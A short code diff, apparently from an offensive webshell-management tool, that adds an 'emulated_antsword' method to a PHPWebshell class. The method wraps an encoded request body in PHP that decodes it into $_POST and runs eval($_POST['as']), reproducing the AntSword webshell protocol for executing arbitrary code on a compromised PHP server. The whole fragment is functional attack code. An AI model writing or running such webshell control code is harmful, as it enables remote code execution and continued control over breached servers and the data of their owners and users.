@@ -1077,5 +1077,11 @@ class PHPWebshell(PHPSessionInterface):
         result = await self.submit(EVAL_PHP.format(code_b64=repr(base64_encode(code))))
         return result
 
-    async def php_eval_raw(self, code: str) -> t.Tuple[int, str]:
+    async def emulated_antsword(self, body: bytes) -> t.Tuple[int, str]:
+        code = """
+        parse_str(base64_decode(B64), $_POST);
+        eval($_POST['as']);
+        """.replace(
+            "B64", repr(base64_encode(body))
+        )
         return await self.submit_raw(code)
